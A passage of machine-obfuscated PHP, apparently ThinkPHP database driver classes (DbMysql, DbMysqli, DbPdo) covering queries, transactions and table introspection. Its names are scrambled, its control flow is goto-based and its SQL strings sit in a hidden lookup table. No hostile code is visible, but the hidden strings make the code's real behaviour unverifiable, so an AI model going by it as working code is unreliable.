think_status($cÁ˜ÛË∑ß‚[20]); $this->queryID = mysql_query($cíÊ‹¬ìˆÚ, $this->_linkID); goto fÎë‚‚ôª; fÎë‚‚ôª: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto c¬∞«˜´ÈÌ; c¬∞«˜´ÈÌ: } public function execute($AÜÇ÷ƒÜ„Æ) { goto BÑ„ûåÀ‡; F≤ü¿®ù¢: $this->queryStr = $AÜÇ÷ƒÜ„Æ; if ($this->queryID) { $this->free(); } think_action_status($füÓ…¥”Êò[21], 1); goto A∆õª††ßô; FùÓØèøƒƒ: if (!1 === $A«ÎÖÈê◊±) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto AˆÉÉ æ£; BÑ„ûåÀ‡: $füÓ…¥”Êò =& $_SERVER[∞„˜ƒÑºª]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto F≤ü¿®ù¢; A∆õª††ßô: think_status($füÓ…¥”Êò[20]); $A«ÎÖÈê◊± = mysql_query($AÜÇ÷ƒÜ„Æ, $this->_linkID); $this->debug(); goto FùÓØèøƒƒ; AˆÉÉ æ£: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[∞„˜ƒÑºª][566], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $AøÖÇµØ°ß = mysql_query($_SERVER[∞„˜ƒÑºª][567], $this->_linkID); $this->transTimes = 0; if (!$AøÖÇµØ°ß) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $dÏÔáØ∑÷Ã = mysql_query($_SERVER[∞„˜ƒÑºª][568], $this->_linkID); $this->transTimes = 0; if (!$dÏÔáØ∑÷Ã) { $this->error(); return !1; } } return !0; } private function getAll() { $BÆ§‘˘Î»Ç = array(); if ($this->numRows > 0) { while ($fÛûïìòµÑ = mysql_fetch_assoc($this->queryID)) { $BÆ§‘˘Î»Ç[] = $fÛûïìòµÑ; } mysql_data_seek($this->queryID, 0); } return $BÆ§‘˘Î»Ç; } public function getFields($Aﬁ∆âÙŒ£Ò) { $aÓ∏óã¨§Ü =& $_SERVER[∞„˜ƒÑºª]; $b ﬁÑ‘˘›Ã = $this->query($aÓ∏óã¨§Ü[569] . $this->parseKey($Aﬁ∆âÙŒ£Ò)); $C¿Í≥•á£˘ = array(); if ($b ﬁÑ‘˘›Ã) { foreach ($b ﬁÑ‘˘›Ã as $D∫áëÜ◊å≠ => $D©áÒ∑˘‡”) { $C¿Í≥•á£˘[$D©áÒ∑˘‡”[$aÓ∏óã¨§Ü[27]]] = array($aÓ∏óã¨§Ü[28] => $D©áÒ∑˘‡”[$aÓ∏óã¨§Ü[27]], $aÓ∏óã¨§Ü[29] => $D©áÒ∑˘‡”[$aÓ∏óã¨§Ü[30]], $aÓ∏óã¨§Ü[31] => (bool) (strtoupper($D©áÒ∑˘‡”[$aÓ∏óã¨§Ü[32]]) === $aÓ∏óã¨§Ü[570]), $aÓ∏óã¨§Ü[34] => $D©áÒ∑˘‡”[$aÓ∏óã¨§Ü[35]], $aÓ∏óã¨§Ü[36] => strtolower($D©áÒ∑˘‡”[$aÓ∏óã¨§Ü[37]]) == $aÓ∏óã¨§Ü[38], $aÓ∏óã¨§Ü[39] => strtolower($D©áÒ∑˘‡”[$aÓ∏óã¨§Ü[40]]) == $aÓ∏óã¨§Ü[41]); } } return $C¿Í≥•á£˘; } public function getTables($böãú‚Ñ®ˆ = '') { $B∂π´Üˆ˜ò =& $_SERVER[∞„˜ƒÑºª]; if (!empty($böãú‚Ñ®ˆ)) { $F©èñŸÌï¯ = $B∂π´Üˆ˜ò[571] . $böãú‚Ñ®ˆ; } else { $F©èñŸÌï¯ = $B∂π´Üˆ˜ò[572]; } $fÖ•âÿ¯Ì∏ = $this->query($F©èñŸÌï¯); $CÛπãÍ¿Ö‡ = array(); foreach ($fÖ•âÿ¯Ì∏ as $dÜˆﬂ¶ÜÖÉ => $b¨óêÍå∏Ü) { $CÛπãÍ¿Ö‡[$dÜˆﬂ¶ÜÖÉ] = current($b¨óêÍå∏Ü); } return $CÛπãÍ¿Ö‡; } public function replace($D…¨Ñ¬ö∏¬, $a˜êÛ‚€∑ = array()) { $a—è”å˜¯Ç =& $_SERVER[∞„˜ƒÑºª]; foreach ($D…¨Ñ¬ö∏¬ as $Cú‰≤¿·ÆÆ => $F∫ØâÑÛ´‹) { $a´™«ÿÿç÷ = $this->parseValue($F∫ØâÑÛ´‹); if (is_scalar($a´™«ÿÿç÷)) { $cÊÌÃ†´≠–[] = $a´™«ÿÿç÷; $C¿º∂¶≤Ô≤[] = $this->parseKey($Cú‰≤¿·ÆÆ); } } $AÇÛªƒöºâ = $a—è”å˜¯Ç[573] . $this->parseTable($a˜êÛ‚€∑[$a—è”å˜¯Ç[266]]) . $a—è”å˜¯Ç[574] . implode($a—è”å˜¯Ç[47], $C¿º∂¶≤Ô≤) . $a—è”å˜¯Ç[575] . implode($a—è”å˜¯Ç[47], $cÊÌÃ†´≠–) . $a—è”å˜¯Ç[576]; return $this->execute($AÇÛªƒöºâ); } public function insertAll($c¯¯ÉÛ˜„®, $d®íƒâ€áë = array(), $A¯ç†àì´ë = false) { goto cÌ≤™⁄°èí; AÓÊ¶–™∏ﬂ: $f¨√¨““∏ñ = array(); foreach ($c¯¯ÉÛ˜„® as $aÌ◊Ô∏∏‹ı) { $bÂìÍ ◊ç‘ = array(); foreach ($aÌ◊Ô∏∏‹ı as $dí£¡ñÜûú => $dô„˜Ñè∏Ï) { $dô„˜Ñè∏Ï = $this->parseValue($dô„˜Ñè∏Ï); if (is_scalar($dô„˜Ñè∏Ï)) { $bÂìÍ ◊ç‘[] = $dô„˜Ñè∏Ï; } } $f¨√¨““∏ñ[] = $FÃÒç≤Óãô[247] . implode($FÃÒç≤Óãô[47], $bÂìÍ ◊ç‘) . $FÃÒç≤Óãô[576]; } array_walk($EÚ‰«Ïû≈∏, array($this, $FÃÒç≤Óãô[577])); goto Eæﬁ» ≤ë™; Eæﬁ» ≤ë™: $dìû∞éÜÔñ = ($A¯ç†àì´ë ? $FÃÒç≤Óãô[578] : $FÃÒç≤Óãô[579]) . $FÃÒç≤Óãô[580] . $this->parseTable($d®íƒâ€áë[$FÃÒç≤Óãô[266]]) . $FÃÒç≤Óãô[574] . implode($FÃÒç≤Óãô[47], $EÚ‰«Ïû≈∏) . $FÃÒç≤Óãô[581] . implode($FÃÒç≤Óãô[47], $f¨√¨““∏ñ); return $this->execute($dìû∞éÜÔñ); goto A’€öàÔú˜; cÌ≤™⁄°èí: $FÃÒç≤Óãô =& $_SERVER[∞„˜ƒÑºª]; if (!is_array($c¯¯ÉÛ˜„®[0])) { return !1; } $EÚ‰«Ïû≈∏ = array_keys($c¯¯ÉÛ˜„®[0]); goto AÓÊ¶–™∏ﬂ; A’€öàÔú˜: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $b®Ÿá√ÒÖë =& $_SERVER[∞„˜ƒÑºª]; $this->error = mysql_errno() . $b®Ÿá√ÒÖë[4] . mysql_error($this->_linkID); if ($b®Ÿá√ÒÖë[33] != $this->queryStr) { $this->error .= LNG($b®Ÿá√ÒÖë[45]) . $this->queryStr; } think_trace($this->error, $b®Ÿá√ÒÖë[33], $b®Ÿá√ÒÖë[46]); return $this->error; } public function escapeString($añÉ’œß£€) { if ($this->_linkID) { return mysql_real_escape_string($añÉ’œß£€, $this->_linkID); } else { return mysql_escape_string($añÉ’œß£€); } } public function parseKey(&$dãÒ£¨©»Ø, $cÕ¯◊Â–™í = true) { $B˜√ÖÈêõ≠ =& $_SERVER[∞„˜ƒÑºª]; if ($cÕ¯◊Â–™í) { $dãÒ£¨©»Ø = $this->parseKeyCheck($dãÒ£¨©»Ø); } if ($dãÒ£¨©»Ø != $B˜√ÖÈêõ≠[172] && !preg_match($B˜√ÖÈêõ≠[582], $dãÒ£¨©»Ø)) { $dãÒ£¨©»Ø = $B˜√ÖÈêõ≠[583] . trim($dãÒ£¨©»Ø, $B˜√ÖÈêõ≠[583]) . $B˜√ÖÈêõ≠[583]; } return $dãÒ£¨©»Ø; } } class DbMysqli extends Db { public function __construct($bÂ¿Ûââœ§ = '') { $BÇÙÜ£ÈÁÇ =& $_SERVER[∞„˜ƒÑºª]; if (!extension_loaded($BÇÙÜ£ÈÁÇ[584])) { think_exception(think_lang($BÇÙÜ£ÈÁÇ[10]) . $BÇÙÜ£ÈÁÇ[585]); } if (!empty($bÂ¿Ûââœ§)) { $this->config = $bÂ¿Ûââœ§; if (empty($this->config[$BÇÙÜ£ÈÁÇ[13]])) { $this->config[$BÇÙÜ£ÈÁÇ[13]] = $BÇÙÜ£ÈÁÇ[33]; } } } public function connect($e‚öÉáéä = '', $a≥óÉ∏÷Çü = 0) { $F‹Âü£Ì§Â =& $_SERVER[∞„˜ƒÑºª]; if (!isset($this->linkID[$a≥óÉ∏÷Çü])) { goto fò˘”ø¨⁄à; Fà∞ Ãí≤´: $Fä»ÀÖ Ì’ = $this->linkID[$a≥óÉ∏÷Çü]->server_version; $this->linkID[$a≥óÉ∏÷Çü]->query($F‹Âü£Ì§Â[562] . think_config($F‹Âü£Ì§Â[563]) . $F‹Âü£Ì§Â[63]); if ($Fä»ÀÖ Ì’ > $F‹Âü£Ì§Â[564]) { $this->linkID[$a≥óÉ∏÷Çü]->query($F‹Âü£Ì§Â[565]); } goto båã¥›õ°è; båã¥›õ°è: $this->connected = !0; if (1 != think_config($F‹Âü£Ì§Â[18])) { unset($this->config); } goto búπÔë—àÀ; fò˘”ø¨⁄à: if (empty($e‚öÉáéä)) { $e‚öÉáéä = $this->config; } $this->linkID[$a≥óÉ∏÷Çü] = new mysqli($e‚öÉáéä[$F‹Âü£Ì§Â[558]], $e‚öÉáéä[$F‹Âü£Ì§Â[560]], $e‚öÉáéä[$F‹Âü£Ì§Â[561]], $e‚öÉáéä[$F‹Âü£Ì§Â[17]], $e‚öÉáéä[$F‹Âü£Ì§Â[559]] ? intval($e‚öÉáéä[$F‹Âü£Ì§Â[559]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto Fà∞ Ãí≤´; búπÔë—àÀ: } return $this->linkID[$a≥óÉ∏÷Çü]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($d¶√ãíÑú–) { goto Eî≈ä¢Ìö; eˆ≠ÚıÛ: $this->queryStr = $d¶√ãíÑú–; if ($this->queryID) { $this->free(); } think_action_status($Eòàﬂè⁄á–[19], 1); goto B…§ê∞á≈ã; B…§ê∞á≈ã: think_status($Eòàﬂè⁄á–[20]); $this->queryID = $this->_linkID->query($d¶√ãíÑú–); if ($this->_linkID->more_results()) { while (($aïÆª¡ çå = $this->_linkID->next_result()) != NULL) { $aïÆª¡ çå->free_result(); } } goto fÖ¯æÙª©¨; fÖ¯æÙª©¨: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto F‰µÙè›«Ÿ; Eî≈ä¢Ìö: $Eòàﬂè⁄á– =& $_SERVER[∞„˜ƒÑºª]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto eˆ≠ÚıÛ; F‰µÙè›«Ÿ: } public function execute($DÒÙ´µ„«˜) { goto EÒ¡≥¬“∆ñ; a∫âƒ®µ⁄¶: if (!1 === $cç≠∫±∑ù) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto f´¥«Ó≥›à; déí·Íå±¯: $this->queryStr = $DÒÙ´µ„«˜; if ($this->queryID) { $this->free(); } think_action_status($A≤êÙ—§Ûø[21], 1); goto F∏∏úñ√‘õ; F∏∏úñ√‘õ: think_status($A≤êÙ—§Ûø[20]); $cç≠∫±∑ù = $this->_linkID->query($DÒÙ´µ„«˜); $this->debug(); goto a∫âƒ®µ⁄¶; EÒ¡≥¬“∆ñ: $A≤êÙ—§Ûø =& $_SERVER[∞„˜ƒÑºª]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto déí·Íå±¯; f´¥«Ó≥›à: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $F’ÑÚ£«∆ä = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$F’ÑÚ£«∆ä) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $e⁄ÛÀ∞ä¿ñ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$e⁄ÛÀ∞ä¿ñ) { $this->error(); return !1; } } return !0; } private function getAll() { $DÕÌ¬–Óæß = array(); if ($this->numRows > 0) { for ($E÷®¨àÒ‡Â = 0; $E÷®¨àÒ‡Â < $this->numRows; $E÷®¨àÒ‡Â++) { $DÕÌ¬–Óæß[$E÷®¨àÒ‡Â] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $DÕÌ¬–Óæß; } public function getFields($CÏî¥ﬂÖΩâ) { $EﬂïÃÉ—®⁄ =& $_SERVER[∞„˜ƒÑºª]; $B´ƒÇÜäÑ¿ = $this->query($EﬂïÃÉ—®⁄[569] . $this->parseKey($CÏî¥ﬂÖΩâ)); $b»É≈∑©™Ÿ = array(); if ($B´ƒÇÜäÑ¿) { foreach ($B´ƒÇÜäÑ¿ as $Dâøˆ…øÜ => $cºñ∑È¥Êü) { $b»É≈∑©™Ÿ[$cºñ∑È¥Êü[$EﬂïÃÉ—®⁄[27]]] = array($EﬂïÃÉ—®⁄[28] => $cºñ∑È¥Êü[$EﬂïÃÉ—®⁄[27]], $EﬂïÃÉ—®⁄[29] => $cºñ∑È¥Êü[$EﬂïÃÉ—®⁄[30]], $EﬂïÃÉ—®⁄[31] => (bool) ($cºñ∑È¥Êü[$EﬂïÃÉ—®⁄[32]] === $EﬂïÃÉ—®⁄[33]), $EﬂïÃÉ—®⁄[34] => $cºñ∑È¥Êü[$EﬂïÃÉ—®⁄[35]], $EﬂïÃÉ—®⁄[36] => strtolower($cºñ∑È¥Êü[$EﬂïÃÉ—®⁄[37]]) == $EﬂïÃÉ—®⁄[38], $EﬂïÃÉ—®⁄[39] => strtolower($cºñ∑È¥Êü[$EﬂïÃÉ—®⁄[40]]) == $EﬂïÃÉ—®⁄[41]); } } return $b»É≈∑©™Ÿ; } public function getTables($eº¬ÕÖ”©… = '') { $F±Œ§°Ö»ª =& $_SERVER[∞„˜ƒÑºª]; $Bµç«Î®ÚÀ = !empty($eº¬ÕÖ”©…) ? $F±Œ§°Ö»ª[571] . $eº¬ÕÖ”©… : $F±Œ§°Ö»ª[572]; $dË¡€≠Æá = $this->query($Bµç«Î®ÚÀ); $EÇ∞¡âØØÃ = array(); if ($dË¡€≠Æá) { foreach ($dË¡€≠Æá as $d« ◊Ü£‹â => $E‘∆Ó·ñ∞ô) { $EÇ∞¡âØØÃ[$d« ◊Ü£‹â] = current($E‘∆Ó·ñ∞ô); } } return $EÇ∞¡âØØÃ; } public function replace($dÓﬁ»¶œƒâ, $AÓ‹±é€Ñ¯ = array()) { $b â¬ÑÇÁë =& $_SERVER[∞„˜ƒÑºª]; foreach ($dÓﬁ»¶œƒâ as $B°úﬁÃÜäâ => $c€††¿úÏ) { $e †ËàÑÂç = $this->parseValue($c€††¿úÏ); if (is_scalar($e †ËàÑÂç)) { $aÕ˘Ì˜‘Ç[] = $e †ËàÑÂç; $fÖËäÉ∞ü∑[] = $this->parseKey($B°úﬁÃÜäâ); } } $böÀåá˜π∏ = $b â¬ÑÇÁë[573] . $this->parseTable($AÓ‹±é€Ñ¯[$b â¬ÑÇÁë[266]]) . $b â¬ÑÇÁë[574] . implode($b â¬ÑÇÁë[47], $fÖËäÉ∞ü∑) . $b â¬ÑÇÁë[575] . implode($b â¬ÑÇÁë[47], $aÕ˘Ì˜‘Ç) . $b â¬ÑÇÁë[576]; return $this->execute($böÀåá˜π∏); } public function insertAll($C¶üÙåÂâÿ, $fî‡—æ„ïÁ = array(), $A∂¢ÔÍü’ù = false) { goto FéÇ§ƒ‹¶ï; c™è◊∫‘≠©: $EØ‘øÑƒèÜ = ($A∂¢ÔÍü’ù ? $e¡ﬁÓ˜∑Öè[578] : $e¡ﬁÓ˜∑Öè[579]) . $e¡ﬁÓ˜∑Öè[580] . $this->parseTable($fî‡—æ„ïÁ[$e¡ﬁÓ˜∑Öè[266]]) . $e¡ﬁÓ˜∑Öè[574] . implode($e¡ﬁÓ˜∑Öè[47], $F˜∂™µí‚ï) . $e¡ﬁÓ˜∑Öè[581] . implode($e¡ﬁÓ˜∑Öè[47], $cœÆÇ™∞ñŸ); return $this->execute($EØ‘øÑƒèÜ); goto AªŸ∏Üùıè; f‡∑ìÔ¶ß: $cœÆÇ™∞ñŸ = array(); foreach ($C¶üÙåÂâÿ as $AËêŸõ…ıà) { $Cπı§ÀﬁéÖ = array(); foreach ($AËêŸõ…ıà as $b‰’ı¬´îÛ => $b†™◊£¯é£) { $b†™◊£¯é£ = $this->parseValue($b†™◊£¯é£); if (is_scalar($b†™◊£¯é£)) { $Cπı§ÀﬁéÖ[] = $b†™◊£¯é£; } } $cœÆÇ™∞ñŸ[] = $e¡ﬁÓ˜∑Öè[247] . implode($e¡ﬁÓ˜∑Öè[47], $Cπı§ÀﬁéÖ) . $e¡ﬁÓ˜∑Öè[576]; } array_walk($F˜∂™µí‚ï, array($this, $e¡ﬁÓ˜∑Öè[577])); goto c™è◊∫‘≠©; FéÇ§ƒ‹¶ï: $e¡ﬁÓ˜∑Öè =& $_SERVER[∞„˜ƒÑºª]; if (!is_array($C¶üÙåÂâÿ[0])) { return !1; } $F˜∂™µí‚ï = array_keys($C¶üÙåÂâÿ[0]); goto f‡∑ìÔ¶ß; AªŸ∏Üùıè: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Fí£õ£ëØ¯ =& $_SERVER[∞„˜ƒÑºª]; $this->error = $this->_linkID->errno . $Fí£õ£ëØ¯[4] . $this->_linkID->error; if ($Fí£õ£ëØ¯[33] != $this->queryStr) { $this->error .= LNG($Fí£õ£ëØ¯[45]) . $this->queryStr; } think_trace($this->error, $Fí£õ£ëØ¯[33], $Fí£õ£ëØ¯[46]); return $this->error; } public function escapeString($eöäïë‚ö) { if ($this->_linkID) { return $this->_linkID->real_escape_string($eöäïë‚ö); } else { return addslashes($eöäïë‚ö); } } public function parseKey(&$Aó’ìû“åÇ, $F·Ô™∫Ö≤ = true) { $EÆöíäåí• =& $_SERVER[∞„˜ƒÑºª]; if ($F·Ô™∫Ö≤) { $Aó’ìû“åÇ = $this->parseKeyCheck($Aó’ìû“åÇ); } if ($Aó’ìû“åÇ != $EÆöíäåí•[172] && !preg_match($EÆöíäåí•[582], $Aó’ìû“åÇ)) { $Aó’ìû“åÇ = $EÆöíäåí•[583] . trim($Aó’ìû“åÇ, $EÆöíäåí•[583]) . $EÆöíäåí•[583]; } return $Aó’ìû“åÇ; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($b°ÀÁø⁄ ú = '') { $Fè—çà”∏° =& $_SERVER[∞„˜ƒÑºª]; if (!class_exists($Fè—çà”∏°[586])) { think_exception(think_lang($Fè—çà”∏°[10]) . $Fè—çà”∏°[587]); } if (!empty($b°ÀÁø⁄ ú)) { $this->config = $b°ÀÁø⁄ ú; if (empty($this->config[$Fè—çà”∏°[13]])) { $this->config[$Fè—çà”∏°[13]] = array(); } } } public function connect($bœ®ëî÷Î¥ = '', $c∑äîåÒåÿ = 0) { $AÓ˜√µÜÂÿ =& $_SERVER[∞„˜ƒÑºª]; if (!isset($this->linkID[$c∑äîåÒåÿ])) { goto a∑ﬂÒÚöÑπ; e«ñºáü√π: $this->linkID[$c∑äîåÒåÿ]->exec($AÓ˜√µÜÂÿ[597] . think_config($AÓ˜√µÜÂÿ[563])); $this->connected = !0; if (1 != think_config($AÓ˜√µÜÂÿ[18])) { unset($this->config); } goto bùΩ«⁄∂‘Ñ; a∑ﬂÒÚöÑπ: if (empty($bœ®ëî÷Î¥)) { $bœ®ëî÷Î¥ = $this->config; } if ($this->pconnect) { $bœ®ëî÷Î¥[$AÓ˜√µÜÂÿ[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$c∑äîåÒåÿ] = new PDO($bœ®ëî÷Î¥[$AÓ˜√µÜÂÿ[588]], $bœ®ëî÷Î¥[$AÓ˜√µÜÂÿ[560]], $bœ®ëî÷Î¥[$AÓ˜√µÜÂÿ[561]], $bœ®ëî÷Î¥[$AÓ˜√µÜÂÿ[13]]); } catch (PDOException $cÿõƒ«„ÍÉ) { think_exception($cÿõƒ«„ÍÉ->getMessage()); } goto AëâÏ¨ì°î; AëâÏ¨ì°î: $this->dbType = $this->_getDsnType($bœ®ëî÷Î¥[$AÓ˜√µÜÂÿ[588]]); if (in_array($this->dbType, array($AÓ˜√µÜÂÿ[589], $AÓ˜√µÜÂÿ[590], $AÓ˜√µÜÂÿ[591], $AÓ˜√µÜÂÿ[592]))) { think_exception($AÓ˜√µÜÂÿ[593] . $this->dbType . $AÓ˜√µÜÂÿ[594] . $this->dbType . $AÓ˜√µÜÂÿ[595]); } if (!$this->linkID[$c∑äîåÒåÿ]) { think_exception($AÓ˜√µÜÂÿ[596]); } goto e«ñºáü√π; bùΩ«⁄∂‘Ñ: } return $this->linkID[$c∑äîåÒåÿ]; } public function free() { $this->PDOStatement = null; } public function query($fÈ¿¨¿õ›®, $Fﬁ›Ù…µ≤ = array()) { goto cıŸÂã›ª; Cﬂ†˘®è¨§: think_action_status($aóñæÍí˘‚[19], 1); think_status($aóñæÍí˘‚[20]); $this->PDOStatement = $this->_linkID->prepare($fÈ¿¨¿õ›®); goto eÔÉ≤Ú•œé; D·¯îÛö∫ƒ: $this->queryStr = $fÈ¿¨¿õ›®; if (!empty($Fﬁ›Ù…µ≤)) { $this->queryStr .= $aóñæÍí˘‚[598] . print_r($Fﬁ›Ù…µ≤, !0) . $aóñæÍí˘‚[599]; } if (!empty($this->PDOStatement)) { $this->free(); } goto Cﬂ†˘®è¨§; cıŸÂã›ª: $aóñæÍí˘‚ =& $_SERVER[∞„˜ƒÑºª]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto D·¯îÛö∫ƒ; BÍî¡ıÚç≠: if (!1 === $d®õêà≠˘÷) { $this->error(); return !1; } else { return $this->getAll(); } goto Bî·ßºº¿à; eÔÉ≤Ú•œé: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $d®õêà≠˘÷ = $this->PDOStatement->execute($Fﬁ›Ù…µ≤); $this->debug(); goto BÍî¡ıÚç≠; Bî·ßºº¿à: } public function execute($B¨ú¶˜õˆ∫, $e¢⁄•¬Ü™Ê = array()) { goto fˆ≠‹…¨˜≥; d⁄Ë´ª‹íê: $EüúåÆÙΩà = $this->PDOStatement->execute($e¢⁄•¬Ü™Ê); $this->debug(); if (!1 === $EüúåÆÙΩà) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($Fé≠é≥Ìòú || preg_match($A∞’Ö›∫·ü[604], $B¨ú¶˜õˆ∫)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto dÏıÉæ…£∫; fˆ≠‹…¨˜≥: $A∞’Ö›∫·ü =& $_SERVER[∞„˜ƒÑºª]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto B™Ùã∏‚Çﬂ; B™Ùã∏‚Çﬂ: $this->queryStr = $B¨ú¶˜õˆ∫; if (!empty($e¢⁄•¬Ü™Ê)) { $this->queryStr .= $A∞’Ö›∫·ü[598] . print_r($e¢⁄•¬Ü™Ê, !0) . $A∞’Ö›∫·ü[599]; } $Fé≠é≥Ìòú = !1; goto EÇåÀÓøæô; c√œâË∏∂: think_status($A∞’Ö›∫·ü[20]); $this->PDOStatement = $this->_linkID->prepare($B¨ú¶˜õˆ∫); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto d⁄Ë´ª‹íê; EÇåÀÓøæô: if ($this->dbType == $A∞’Ö›∫·ü[592]) { if (preg_match($A∞’Ö›∫·ü[600], $this->queryStr, $føêœèÜàÀ)) { $this->table = think_config($A∞’Ö›∫·ü[601]) . str_ireplace(think_config($A∞’Ö›∫·ü[602]), $A∞’Ö›∫·ü[361], $føêœèÜàÀ[2]); $Fé≠é≥Ìòú = (bool) $this->query($A∞’Ö›∫·ü[603] . strtoupper($this->table) . $A∞’Ö›∫·ü[63]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($A∞’Ö›∫·ü[21], 1); goto c√œâË∏∂; dÏıÉæ…£∫: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $dŸ´¥ÕÈ≈ƒ = $this->_linkID->commit(); $this->transTimes = 0; if (!$dŸ´¥ÕÈ≈ƒ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $a∑´ß˘¿∏Ö = $this->_linkID->rollback(); $this->transTimes = 0; if (!$a∑´ß˘¿∏Ö) { $this->error(); return !1; } } return !0; } private function getAll() { $A¿éâπàçë = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($A¿éâπàçë); return $A¿éâπàçë; } public function getFields($CÀ£Ûëø∫‘) { goto fâîπﬁó•ç; Eãı¯öâ‹è: $e‚∆üÉê‚” = $this->query($fÜ«Õ´ÖÖ¥); $bﬁéôºßáº = array(); if ($e‚∆üÉê‚”) { foreach ($e‚∆üÉê‚” as $F»€„ÀîËﬁ => $aÖ∂ß˘èµì) { $aÖ∂ß˘èµì = array_change_key_case($aÖ∂ß˘èµì); $aÖ∂ß˘èµì[$d¯¨¬Ç˘¨û[28]] = isset($aÖ∂ß˘èµì[$d¯¨¬Ç˘¨û[28]]) ? $aÖ∂ß˘èµì[$d¯¨¬Ç˘¨û[28]] : $d¯¨¬Ç˘¨û[361]; $aÖ∂ß˘èµì[$d¯¨¬Ç˘¨û[29]] = isset($aÖ∂ß˘èµì[$d¯¨¬Ç˘¨û[29]]) ? $aÖ∂ß˘èµì[$d¯¨¬Ç˘¨û[29]] : $d¯¨¬Ç˘¨û[361]; $bó‡äÔˆ–¬ = isset($aÖ∂ß˘èµì[$d¯¨¬Ç˘¨û[260]]) ? $aÖ∂ß˘èµì[$d¯¨¬Ç˘¨û[260]] : $aÖ∂ß˘èµì[$d¯¨¬Ç˘¨û[28]]; $bﬁéôºßáº[$bó‡äÔˆ–¬] = array($d¯¨¬Ç˘¨û[28] => $bó‡äÔˆ–¬, $d¯¨¬Ç˘¨û[29] => $aÖ∂ß˘èµì[$d¯¨¬Ç˘¨û[29]], $d¯¨¬Ç˘¨û[31] => (bool) (isset($aÖ∂ß˘èµì[$d¯¨¬Ç˘¨û[106]]) && $aÖ∂ß˘èµì[$d¯¨¬Ç˘¨û[106]] === $d¯¨¬Ç˘¨û[33] || isset($aÖ∂ß˘èµì[$d¯¨¬Ç˘¨û[31]]) && $aÖ∂ß˘èµì[$d¯¨¬Ç˘¨û[31]] === $d¯¨¬Ç˘¨û[33]), $d¯¨¬Ç˘¨û[34] => isset($aÖ∂ß˘èµì[$d¯¨¬Ç˘¨û[34]]) ? $aÖ∂ß˘èµì[$d¯¨¬Ç˘¨û[34]] : (isset($aÖ∂ß˘èµì[$d¯¨¬Ç˘¨û[61]]) ? $aÖ∂ß˘èµì[$d¯¨¬Ç˘¨û[61]] : $d¯¨¬Ç˘¨û[361]), $d¯¨¬Ç˘¨û[36] => isset($aÖ∂ß˘èµì[$d¯¨¬Ç˘¨û[96]]) ? strtolower($aÖ∂ß˘èµì[$d¯¨¬Ç˘¨û[96]]) == $d¯¨¬Ç˘¨û[38] : (isset($aÖ∂ß˘èµì[$d¯¨¬Ç˘¨û[62]]) ? $aÖ∂ß˘èµì[$d¯¨¬Ç˘¨û[62]] : !1), $d¯¨¬Ç˘¨û[39] => isset($aÖ∂ß˘èµì[$d¯¨¬Ç˘¨û[621]]) ? strtolower($aÖ∂ß˘èµì[$d¯¨¬Ç˘¨û[621]]) == $d¯¨¬Ç˘¨û[41] : (isset($aÖ∂ß˘èµì[$d¯¨¬Ç˘¨û[96]]) ? $aÖ∂ß˘èµì[$d¯¨¬Ç˘¨û[96]] : !1)); } } goto fñÿë≤≈Œ»; fñÿë≤≈Œ»: return $bﬁéôºßáº; goto cÓ˜Ù≥í´π; fâîπﬁó•ç: $d¯¨¬Ç˘¨û =& $_SERVER[∞„˜ƒÑºª]; $this->initConnect(!0); if (think_config($d¯¨¬Ç˘¨û[605])) { $fÜ«Õ´ÖÖ¥ = str_replace($d¯¨¬Ç˘¨û[606], $CÀ£Ûëø∫‘, think_config($d¯¨¬Ç˘¨û[605])); } else { switch ($this->dbType) { case $d¯¨¬Ç˘¨û[589]: case $d¯¨¬Ç˘¨û[607]: $fÜ«Õ´ÖÖ¥ = 